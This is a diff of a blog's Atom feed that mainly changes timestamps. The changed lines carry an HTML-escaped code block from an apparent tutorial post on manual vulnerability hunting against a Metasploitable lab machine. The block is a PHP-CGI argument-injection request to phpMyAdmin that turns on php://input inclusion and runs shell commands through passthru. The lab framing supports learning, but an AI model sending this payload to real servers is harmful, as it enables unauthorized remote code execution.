@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-10-14T10:26:58.173Z</updated>
+  <updated>2020-10-14T10:28:36.597Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="http://yoursite.com/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/"/>
     <id>http://yoursite.com/2020/10/14/%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-1-%E9%BB%98%E8%AE%A4%E5%AE%89%E8%A3%85/</id>
     <published>2020-10-14T09:30:17.000Z</published>
-    <updated>2020-10-14T10:26:58.173Z</updated>
+    <updated>2020-10-14T10:28:36.597Z</updated>
     
     <summary type="html">
     
@@ -30,7 +30,7 @@
 &lt;/li&gt;
 &lt;li&gt;&lt;p&gt;phpMyAdmin/setup&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;MetaSploitable &lt;figure class=&quot;hljs highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;hljs plain&quot;&gt;POST http:&amp;#x2F;&amp;#x2F;&amp;#x2F;phpMyAdmin&amp;#x2F;?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp:&amp;#x2F;&amp;#x2F;input HTTP&amp;#x2F;1.1&lt;br&gt;Host: 192.168.20.10&lt;br&gt;Content-Length: 40&lt;br&gt;&amp;amp;nbsp;&lt;br&gt;&amp;lt;?php&lt;br&gt;passthru(&amp;#39;pwd&amp;amp;&amp;amp;ls&amp;#39;); &lt;br&gt;die();&lt;br&gt;?&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;li&gt;MetaSploitable &lt;figure class=&quot;hljs highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;hljs plain&quot;&gt;POST http:&amp;#x2F;&amp;#x2F;&amp;#x2F;phpMyAdmin&amp;#x2F;?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp:&amp;#x2F;&amp;#x2F;input HTTP&amp;#x2F;1.1&lt;br&gt;Host: 192.168.20.10&lt;br&gt;Content-Length: 40&lt;br&gt;&lt;br&gt;&amp;lt;?php&lt;br&gt;passthru(&amp;#39;pwd&amp;amp;&amp;amp;ls&amp;#39;); &lt;br&gt;die();&lt;br&gt;?&amp;gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 
 
